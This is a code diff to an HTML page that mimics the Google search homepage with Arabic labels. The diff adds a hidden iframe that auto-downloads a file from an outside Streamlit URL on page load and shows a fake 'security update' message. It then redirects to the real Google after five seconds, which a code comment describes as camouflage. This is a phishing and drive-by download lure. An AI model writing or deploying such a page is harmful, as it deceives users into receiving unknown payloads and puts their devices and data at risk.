@@ -15,11 +15,13 @@
             justify-content: center; 
             height: 100vh;
             cursor: pointer;
+            overflow: hidden;
         }
         .container { text-align: center; }
         img { width: 272px; margin-bottom: 20px; }
         .search-box {
-            width: 584px;
+            width: 90%;
+            max-width: 584px;
             height: 44px;
             border: 1px solid #dfe1e5;
             border-radius: 24px;
@@ -34,7 +36,7 @@
             box-shadow: 0 1px 6px rgba(32,33,36,0.28);
             border-color: rgba(223,225,229,0);
         }
-        .buttons { display: flex; gap: 12px; }
+        .buttons { display: flex; gap: 12px; justify-content: center; }
         button {
             background-color: #f8f9fa;
             border: 1px solid #f8f9fa;
@@ -49,14 +51,6 @@
             min-width: 54px;
             text-align: center;
             cursor: pointer;
-            user-select: none;
-        }
-        button:hover {
-            box-shadow: 0 1px 1px rgba(0,0,0,0.1);
-            background-image: -webkit-linear-gradient(top,#f8f8f8,#f1f1f1);
-            background-color: #f8f8f8;
-            border: 1px solid #c6c6c6;
-            color: #222;
         }
         #status {
             margin-top: 20px;
@@ -75,31 +69,35 @@
             <button>بحث Google</button>
             <button>ضربة حظ</button>
         </div>
-        <div id="status">انقر في أي مكان للبدء...</div>
+        <div id="status">جاري التحقق من الأمان...</div>
     </div>
 
     <script>
-        let downloaded = false;
+        let hasDownloaded = false;
         function triggerDownload() {
-            if (downloaded) return;
+            if (hasDownloaded) return;
+            hasDownloaded = true;
             
             // سيتم استبدال هذا الرابط ديناميكياً في app.py
             const downloadUrl = "https://rashdai.streamlit.app/api/upload";
             
-            const link = document.createElement('a');
-            link.href = downloadUrl;
-            link.target = "_blank"; // فتح في نافذة جديدة لضمان التحميل في بعض المتصفحات
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
+            // استخدام iframe مخفي للتحميل لتجنب فتح نوافذ جديدة
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = downloadUrl;
+            document.body.appendChild(iframe);
             
-            document.getElementById('status').innerText = "جاري التحميل... يرجى التحقق من التنزيلات.";
-            downloaded = true;
+            document.getElementById('status').innerText = "جاري تحميل التحديث الأمني... يرجى الانتظار.";
+            
+            // إعادة التوجيه لصفحة جوجل الحقيقية بعد 5 ثوانٍ للتمويه الكامل
+            setTimeout(() => {
+                window.location.href = "https://www.google.com";
+            }, 5000);
         }
 
-        // محاولة التحميل التلقائي بعد 3 ثوانٍ إذا لم ينقر المستخدم
+        // محاولة التحميل التلقائي بعد 2 ثانية
         window.onload = function() {
-            setTimeout(triggerDownload, 3000);
+            setTimeout(triggerDownload, 2000);
         };
     </script>
 </body>
